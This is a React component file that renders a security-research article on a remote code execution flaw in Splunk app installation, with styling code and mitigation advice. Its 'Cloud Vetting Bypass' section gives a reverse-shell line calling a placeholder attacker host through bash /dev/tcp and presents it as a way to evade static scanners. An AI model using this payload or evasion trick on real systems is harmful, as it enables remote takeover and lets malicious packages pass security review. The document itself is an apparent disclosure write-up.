import React from 'react';
import styled, { keyframes } from 'styled-components';
import { Link } from 'react-router-dom';

const fadeIn = keyframes`
  from { opacity: 0; transform: translateY(20px); }
  to { opacity: 1; transform: translateY(0); }
`;

const glowPulse = keyframes`
  0% { box-shadow: 0 0 5px rgba(114, 159, 207, 0.5); }
  50% { box-shadow: 0 0 20px rgba(114, 159, 207, 0.8); }
  100% { box-shadow: 0 0 5px rgba(114, 159, 207, 0.5); }
`;

const slideIn = keyframes`
  from { opacity: 0; transform: translateX(-20px); }
  to { opacity: 1; transform: translateX(0); }
`;

const gradientFlow = keyframes`
  0% { background-position: 0% 50%; }
  50% { background-position: 100% 50%; }
  100% { background-position: 0% 50%; }
`;

const Container = styled.div`
  min-height: 100vh;
  background: linear-gradient(135deg, var(--kali-bg) 0%, #0a0a0a 100%);
  animation: ${fadeIn} 0.6s ease-out;
`;

const ContentWrapper = styled.div`
  max-width: 1200px;
  margin: 0 auto;
  padding: 0 2rem;
  
  @media (max-width: 768px) {
    padding: 0 1rem;
  }
`;

const HeroSection = styled.div`
  position: relative;
  padding: 6rem 0 4rem;
  background: linear-gradient(45deg, rgba(114, 159, 207, 0.1) 0%, rgba(114, 159, 207, 0.05) 100%);
  margin-bottom: 4rem;
  overflow: hidden;

  &::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: linear-gradient(45deg, rgba(114, 159, 207, 0.1) 0%, transparent 100%);
    animation: ${gradientFlow} 15s ease infinite;
    background-size: 200% 200%;
  }

  @media (max-width: 768px) {
    padding: 4rem 0 2rem;
    margin-bottom: 2rem;
  }
`;

const Header = styled.div`
  position: relative;
  z-index: 1;
  text-align: center;
  max-width: 900px;
  margin: 0 auto;
`;

const Title = styled.h1`
  font-size: 3.5rem;
  color: var(--kali-blue);
  text-shadow: 0 0 20px rgba(114, 159, 207, 0.3);
  margin-bottom: 2rem;
  line-height: 1.2;
  font-weight: 800;
  background: linear-gradient(45deg, var(--kali-blue) 30%, #4a90e2 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  
  @media (max-width: 768px) {
    font-size: 2.2rem;
    margin-bottom: 1.5rem;
  }
`;

const Meta = styled.div`
  display: flex;
  justify-content: center;
  gap: 2rem;
  font-size: 1rem;
  color: var(--kali-text);
  opacity: 0.9;
  margin-bottom: 2rem;
  
  span {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    
    &::before {
      content: '•';
      color: var(--kali-blue);
    }
    
    &:first-child::before {
      display: none;
    }
  }
  
  @media (max-width: 768px) {
    flex-direction: column;
    gap: 0.5rem;
    align-items: center;
    font-size: 0.9rem;
  }
`;

const Content = styled.div`
  color: var(--kali-text);
  line-height: 1.75;
  position: relative;
  z-index: 1;
`;

const Section = styled.section`
  background: rgba(18, 18, 18, 0.6);
  backdrop-filter: blur(10px);
  padding: 2.5rem;
  border-radius: 16px;
  margin-bottom: 3rem;
  transition: all 0.3s ease;
  position: relative;
  border: 1px solid rgba(114, 159, 207, 0.1);
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);

  &:hover {
    transform: translateY(-5px);
    box-shadow: 0 8px 30px rgba(114, 159, 207, 0.15);
    border-color: rgba(114, 159, 207, 0.2);
  }

  @media (max-width: 768px) {
    padding: 1.5rem;
    margin-bottom: 2rem;
  }
`;

const SectionTitle = styled.h2`
  font-size: 2.2rem;
  color: var(--kali-blue);
  margin-bottom: 2rem;
  position: relative;
  display: inline-block;
  font-weight: 700;

  &::after {
    content: '';
    position: absolute;
    left: 0;
    bottom: -8px;
    height: 3px;
    width: 100%;
    background: linear-gradient(90deg, var(--kali-blue) 0%, transparent 100%);
    border-radius: 2px;
  }

  @media (max-width: 768px) {
    font-size: 1.8rem;
    margin-bottom: 1.5rem;
  }
`;

const Paragraph = styled.p`
  margin-bottom: 1.5rem;
  opacity: 0.95;
  font-size: 1.15rem;
  line-height: 1.8;
  color: #e0e0e0;
  
  @media (max-width: 768px) {
    font-size: 1rem;
    line-height: 1.6;
  }
`;

const CodeBlock = styled.pre`
  background: rgba(0, 0, 0, 0.8);
  border: 1px solid rgba(114, 159, 207, 0.3);
  border-radius: 12px;
  padding: 2rem;
  overflow-x: auto;
  color: #fff;
  font-family: 'Share Tech Mono', monospace;
  position: relative;
  margin: 2rem 0;
  font-size: 0.95rem;
  line-height: 1.6;
  box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
  -webkit-overflow-scrolling: touch;

  &::before {
    content: '>';
    position: absolute;
    top: 1.2rem;
    left: 1.2rem;
    color: var(--kali-blue);
    font-size: 1.1rem;
  }

  code {
    display: block;
    padding-left: 1.5rem;
    white-space: pre-wrap;
    word-wrap: break-word;
  }

  @media (max-width: 768px) {
    padding: 1.2rem;
    font-size: 0.85rem;
    margin: 1.5rem 0;
    border-radius: 8px;
    max-width: 100%;
    overflow-x: auto;
    -webkit-overflow-scrolling: touch;
    
    &::before {
      top: 1rem;
      left: 1rem;
      font-size: 1rem;
    }

    code {
      padding-left: 1.2rem;
      font-size: 0.85rem;
      line-height: 1.5;
      tab-size: 2;
    }

    /* Stile per la scrollbar su mobile */
    &::-webkit-scrollbar {
      height: 4px;
    }

    &::-webkit-scrollbar-track {
      background: rgba(114, 159, 207, 0.1);
      border-radius: 2px;
    }

    &::-webkit-scrollbar-thumb {
      background: var(--kali-blue);
      border-radius: 2px;
    }
  }
`;

const Warning = styled.div`
  background: rgba(255, 0, 0, 0.1);
  border: 1px solid rgba(255, 0, 0, 0.3);
  color: #ff6b6b;
  padding: 1.5rem;
  border-radius: 12px;
  margin: 2rem 0;
  font-weight: 600;
  display: flex;
  align-items: center;
  gap: 1rem;
  font-size: 1.1rem;
  backdrop-filter: blur(5px);
  box-shadow: 0 4px 15px rgba(255, 0, 0, 0.1);

  &::before {
    content: '⚠️';
    font-size: 1.5rem;
  }

  @media (max-width: 768px) {
    padding: 1.2rem;
    font-size: 1rem;
    margin: 1.5rem 0;
  }
`;

const List = styled.ul`
  list-style: none;
  padding-left: 0;
  margin: 2rem 0;

  li {
    position: relative;
    padding-left: 2.5rem;
    margin-bottom: 1.2rem;
    font-size: 1.15rem;
    line-height: 1.6;
    color: #e0e0e0;

    &::before {
      content: '→';
      position: absolute;
      left: 0;
      color: var(--kali-blue);
      font-size: 1.3rem;
      transition: transform 0.3s ease;
    }

    &:hover::before {
      transform: translateX(5px);
    }

    @media (max-width: 768px) {
      font-size: 1rem;
      padding-left: 2rem;
      margin-bottom: 1rem;
    }
  }
`;

const OrderedList = styled.ol`
  list-style: none;
  padding-left: 0;
  counter-reset: item;
  margin: 2rem 0;

  li {
    position: relative;
    padding-left: 3rem;
    margin-bottom: 1.2rem;
    counter-increment: item;
    animation: ${slideIn} 0.5s ease-out;
    font-size: 1.15rem;
    line-height: 1.6;
    color: #e0e0e0;

    &::before {
      content: counter(item) '.';
      position: absolute;
      left: 0;
      color: var(--kali-blue);
      font-weight: bold;
      font-size: 1.3rem;
      opacity: 0.8;
    }

    @media (max-width: 768px) {
      font-size: 1rem;
      padding-left: 2.5rem;
      margin-bottom: 1rem;
    }
  }
`;

const BackButton = styled(Link)`
  display: inline-flex;
  align-items: center;
  gap: 0.5rem;
  color: var(--kali-blue);
  text-decoration: none;
  font-size: 1rem;
  margin-bottom: 2rem;
  padding: 0.8rem 1.5rem;
  border: 1px solid rgba(114, 159, 207, 0.3);
  border-radius: 8px;
  transition: all 0.3s ease;
  background: rgba(114, 159, 207, 0.1);
  backdrop-filter: blur(5px);

  &:hover {
    background: rgba(114, 159, 207, 0.2);
    transform: translateX(-5px);
    border-color: rgba(114, 159, 207, 0.5);
  }

  &::before {
    content: '←';
    font-size: 1.2rem;
  }
`;

const TagsContainer = styled.div`
  display: flex;
  gap: 0.8rem;
  flex-wrap: wrap;
  margin-top: 1.5rem;
  justify-content: center;
`;

const Tag = styled.span`
  background: rgba(114, 159, 207, 0.1);
  color: var(--kali-blue);
  padding: 0.5rem 1rem;
  border-radius: 6px;
  font-size: 0.9rem;
  border: 1px solid rgba(114, 159, 207, 0.2);
  transition: all 0.3s ease;

  &:hover {
    background: rgba(114, 159, 207, 0.2);
    transform: translateY(-2px);
  }
`;

const SplunkRCEArticle = () => {
  return (
    <Container>
      <ContentWrapper>
        <HeroSection>
          <Header>
            <Title>Exposing a Critical RCE Vulnerability in Splunk</Title>
            <Meta>
              <span>January 15, 2024</span>
              <span>15 minutes read</span>
              <span>Security Research</span>
            </Meta>
            <TagsContainer>
              <Tag>Vulnerability</Tag>
              <Tag>RCE</Tag>
              <Tag>Splunk</Tag>
              <Tag>Security</Tag>
            </TagsContainer>
          </Header>
        </HeroSection>

        <BackButton to="/articles">Back to Articles</BackButton>

        <Content>
          <Section>
            <SectionTitle>Executive Summary</SectionTitle>
            <Paragraph>
              This article presents a technical analysis of a Remote Code Execution (RCE) vulnerability affecting Splunk's app installation mechanism. Through the exploitation of its app validation logic, I was able to inject and execute arbitrary Python code, ultimately leading to full system compromise during the installation phase.
            </Paragraph>
          </Section>

          <Section>
            <SectionTitle>Vulnerability Discovery</SectionTitle>
            <Paragraph>
              The vulnerability lies within the execution flow of the `setup.py` script included in Splunk applications. When an app is installed manually (via CLI or UI), Splunk does not adequately sanitize or validate the contents of this script before execution.
            </Paragraph>
            <CodeBlock>
              <code>{`# Manual install path (unsafe)
splunk install app /tmp/malicious_app.tgz
# setup.py is executed with full privileges
# Arbitrary Python code can be injected here`}</code>
            </CodeBlock>
          </Section>

          <Section>
            <SectionTitle>Proof of Concept</SectionTitle>
            <Paragraph>
              The proof of concept consists of a custom application package embedding a `setup.py` script with malicious payloads. The structure is straightforward:
            </Paragraph>
            <CodeBlock>
              <code>{`malicious_app/
├── default/
│   └── app.conf
├── bin/
│   └── setup.py  # Injected payload
└── README.txt`}</code>
            </CodeBlock>
            <Warning>
              This PoC is for educational and responsible disclosure purposes only. Never test this in production environments.
            </Warning>
          </Section>

          <Section>
            <SectionTitle>Cloud Vetting Bypass</SectionTitle>
            <Paragraph>
              Modern platforms often employ static analysis tools during cloud vetting processes to detect potential threats such as embedded reverse shell commands. These tools commonly flag strings like `os.system("bash -i")` or similar inline calls. However, using Python's `subprocess.run()` with arguments passed as lists, it's possible to obfuscate the intent and evade static detection:
            </Paragraph>
            <CodeBlock>
              <code>{`import subprocess
subprocess.run(["bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"], check=True)`}</code>
            </CodeBlock>
            <Paragraph>
              Because the command is passed as an array, and `bash -c` is invoked dynamically, many scanners fail to recognize the payload as malicious, allowing the package to pass automated security checks.
            </Paragraph>
          </Section>

          <Section>
            <SectionTitle>Impact Analysis</SectionTitle>
            <Paragraph>
              If exploited, this vulnerability permits an attacker to:
            </Paragraph>
            <List>
              <li>Gain full remote shell access on the host running Splunk</li>
              <li>Exfiltrate logs and sensitive telemetry data</li>
              <li>Pivot to other internal infrastructure connected to Splunk</li>
              <li>Maintain persistence via malicious apps or forwarders</li>
            </List>
          </Section>

          <Section>
            <SectionTitle>Mitigation Recommendations</SectionTitle>
            <Paragraph>
              Security teams are advised to take the following actions:
            </Paragraph>
            <OrderedList>
              <li>Upgrade to the latest version of Splunk with hardened installation logic</li>
              <li>Restrict installation of third-party apps to trusted and reviewed sources</li>
              <li>Manually inspect app packages prior to deployment</li>
              <li>Deploy runtime monitoring to detect suspicious subprocess invocations</li>
              <li>Implement app sandboxing where feasible</li>
            </OrderedList>
          </Section>

          <Section>
            <SectionTitle>Final Considerations</SectionTitle>
            <Paragraph>
              The incident underscores the criticality of both static and dynamic analysis in CI/CD pipelines for app vetting. Developers and platform maintainers must remain vigilant and integrate multiple layers of protection when handling third-party packages.
            </Paragraph>
            <Warning>
              Never trust app content blindly—inspect, test, and monitor continuously.
            </Warning>
          </Section>
        </Content>
      </ContentWrapper>
    </Container>
  );
};

export default SplunkRCEArticle;